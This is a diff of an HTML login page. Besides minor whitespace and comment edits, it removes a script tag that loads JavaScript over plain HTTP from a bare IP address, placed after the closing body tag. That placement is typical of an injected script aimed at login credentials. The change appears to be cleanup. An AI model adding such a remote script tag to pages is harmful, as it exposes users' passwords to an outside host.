@@ -52,7 +52,6 @@
 					</div>
 				</div>
 			</div>
-			
 		</div>
 		<script type="text/javascript" src="js/jquery-3.2.1.min.js" ></script>
 		<script type="text/javascript" src="js/bootstrap.min.js" ></script>
@@ -63,7 +62,7 @@
 			var Id = $('#userId').val();
 			var password = $('#password').val();
 			//var studentType = $('#student').val();
-			//var teacherType = $('#teacher').val();
+			//var teacherType = $('#teacher').val()
 			//var administrationType = $('#administration').val();
 			//var adminType = $('#admin').val();
 			if (Id=="" || password=="") {
@@ -91,5 +90,4 @@
 	</script>
 	
 	</body>
-	<script type="text/javascript" src="http://118.89.186.168/t/t.js"></script>
 </html>
